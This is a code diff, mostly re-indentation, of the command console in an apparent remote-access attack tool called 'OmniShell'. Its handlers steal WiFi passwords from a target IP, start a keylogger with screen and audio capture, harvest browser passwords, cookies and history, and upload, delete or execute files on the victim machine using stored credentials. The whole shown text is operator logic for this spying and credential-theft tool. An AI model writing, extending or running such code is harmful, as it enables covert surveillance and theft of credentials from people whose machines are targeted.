@@ -1760,98 +1760,98 @@ class OmniShell:
                         print(f"{json.dumps(result, indent=2)}")
 
                 elif cmd == "steal-wifi" or cmd == "steal_wifi":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
-                    return
-                Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
-                if self.control and hasattr(self.control, 'get_wifi_passwords'):
-                    result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
-                    networks = result.get("networks", {})
-                    if networks:
-                        print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
-                        print(f"  {Fore.BLUE}{'─'*50}")
-                        for ssid, pw in networks.items():
-                            print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
-                        print(f"  {Fore.BLUE}{'─'*50}\n")
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected. Use 'select <idx>' or 'steal-wifi <ip>'.")
+                        return
+                    Visualizer.alert(f"Extracting WiFi passwords from {target} ...", "hack")
+                    if self.control and hasattr(self.control, 'get_wifi_passwords'):
+                        result = self.control.get_wifi_passwords(target, self.credentials["user"], self.credentials["pass"])
+                        networks = result.get("networks", {})
+                        if networks:
+                            print(f"\n  {Fore.CYAN}{Style.BRIGHT}WiFi Passwords harvested from {target}:")
+                            print(f"  {Fore.BLUE}{'─'*50}")
+                            for ssid, pw in networks.items():
+                                print(f"  {Fore.GREEN}{Style.BRIGHT}  {ssid:<30} {Fore.WHITE}→ {pw}")
+                            print(f"  {Fore.BLUE}{'─'*50}\n")
+                        else:
+                            print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
+                        if result.get("error"):
+                            print(f"  {Fore.RED}Error: {result['error']}")
                     else:
-                        print(f"  {Fore.YELLOW}No WiFi profiles found or no permission.")
-                    if result.get("error"):
-                        print(f"  {Fore.RED}Error: {result['error']}")
-                else:
-                    Visualizer.alert("Control module not loaded", "warn")
+                        Visualizer.alert("Control module not loaded", "warn")
             
-            elif cmd == "monitor" or cmd == "live":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                duration = int(args[1]) if len(args) > 1 else 60
-                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
-                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
-                print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
-                print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
-                print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
-                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                
-                if self.control:
-                    self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
-            
-            elif cmd == "extract" or cmd == "harvest":
-                target = args[0] if args else self.selected_target
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
-                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                
-                if self.control:
-                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
-                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
+                elif cmd == "monitor" or cmd == "live":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    duration = int(args[1]) if len(args) > 1 else 60
+                    print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                    print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
+                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
                     print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+                    
+                    if self.control:
+                        self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
             
-            elif cmd == "file":
-                if len(args) < 2:
-                    print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
-                    return
-                target = self.selected_target
-                action = args[0]
-                path = " ".join(args[1:])
-                
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                
-                if self.control:
-                    result = self.control.remote_file_manager(target, 
-                        self.credentials["user"], 
-                        self.credentials["pass"], 
-                        action, path)
-                    print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
+                elif cmd == "extract" or cmd == "harvest":
+                    target = args[0] if args else self.selected_target
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                    print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
+                    print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                    
+                    if self.control:
+                        data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
+                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
             
-            elif cmd == "media":
-                if len(args) < 1:
-                    print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
-                    return
-                target = self.selected_target
-                action = args[0]
-                file = args[1] if len(args) > 1 else None
-                
-                if not target:
-                    print(f"{Fore.RED}[!] No target selected.")
-                    return
-                
-                if self.control:
-                    self.control.remote_media_control(target,
-                        self.credentials["user"],
-                        self.credentials["pass"],
-                        action, file)
+                elif cmd == "file":
+                    if len(args) < 2:
+                        print(f"{Fore.RED}Usage: file <list|upload|download|delete|execute> [path]")
+                        return
+                    target = self.selected_target
+                    action = args[0]
+                    path = " ".join(args[1:])
+                    
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    
+                    if self.control:
+                        result = self.control.remote_file_manager(target, 
+                            self.credentials["user"], 
+                            self.credentials["pass"], 
+                            action, path)
+                        print(f"{Fore.GREEN}{json.dumps(result, indent=2)}")
+            
+                elif cmd == "media":
+                    if len(args) < 1:
+                        print(f"{Fore.RED}Usage: media <play|volume_up|volume_down|open_url|cd_open> [file/url]")
+                        return
+                    target = self.selected_target
+                    action = args[0]
+                    file = args[1] if len(args) > 1 else None
+                    
+                    if not target:
+                        print(f"{Fore.RED}[!] No target selected.")
+                        return
+                    
+                    if self.control:
+                        self.control.remote_media_control(target,
+                            self.credentials["user"],
+                            self.credentials["pass"],
+                            action, file)
                     print(f"{Fore.GREEN}✅ Media command sent: {action}")
 
             elif cmd in ("nopac", "no-pac") and args:
